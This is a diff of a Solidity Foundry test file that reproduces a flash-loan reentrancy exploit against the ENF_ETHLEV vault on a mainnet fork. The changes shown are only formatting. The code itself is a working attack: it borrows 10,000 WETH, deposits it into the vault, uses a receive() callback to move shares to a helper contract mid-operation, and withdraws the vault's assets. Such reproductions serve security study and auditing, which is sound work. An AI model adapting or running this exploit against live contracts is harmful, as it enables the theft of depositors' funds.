@@ -19,13 +19,13 @@ import "./interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IENF_ETHLEV is IERC20 {
-    function deposit(uint256 assets, address receiver) external payable returns(uint256);
+    function deposit(uint256 assets, address receiver) external payable returns (uint256);
 
-    function withdraw(uint256 assets, address receiver) external returns(uint256);
+    function withdraw(uint256 assets, address receiver) external returns (uint256);
 
-    function convertToAssets(uint256 shares) external view returns(uint256);
+    function convertToAssets(uint256 shares) external view returns (uint256);
 
-    function totalAssets() external view returns(uint256);
+    function totalAssets() external view returns (uint256);
 }
 
 contract ContractTest is Test {
@@ -37,7 +37,7 @@ contract ContractTest is Test {
     uint256 nonce;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 17875885);
+        vm.createSelectFork("mainnet", 17_875_885);
         vm.label(address(WETH), "WETH");
         vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");
         vm.label(address(Pair), "Piar");
@@ -46,17 +46,17 @@ contract ContractTest is Test {
     function testExploit() external {
         deal(address(this), 0);
 
-        exploiter =  new Exploiter();
+        exploiter = new Exploiter();
         Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
 
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
+            );
     }
 
     function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
         WETH.withdraw(WETH.balanceOf(address(this)));
-        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint).max);
+        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
         uint256 assets = ENF_ETHLEV.totalAssets();
         ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares
 
@@ -67,23 +67,22 @@ contract ContractTest is Test {
 
         WETH.deposit{value: address(this).balance}();
         uint256 amount = abi.decode(data, (uint256));
-        WETH.transfer(address(Pair), amount1 + amount); 
-    }       
+        WETH.transfer(address(Pair), amount1 + amount);
+    }
 
     receive() external payable {
         if (msg.sender == Controller && nonce == 0) {
             ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1000);
             nonce++;
         }
-       
     }
-
 }
 
 contract Exploiter {
     IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
+
     function withdraw() external {
-        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint).max);
+        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
         uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
         ENF_ETHLEV.withdraw(assetsAmount, address(this));
         payable(msg.sender).transfer(address(this).balance);
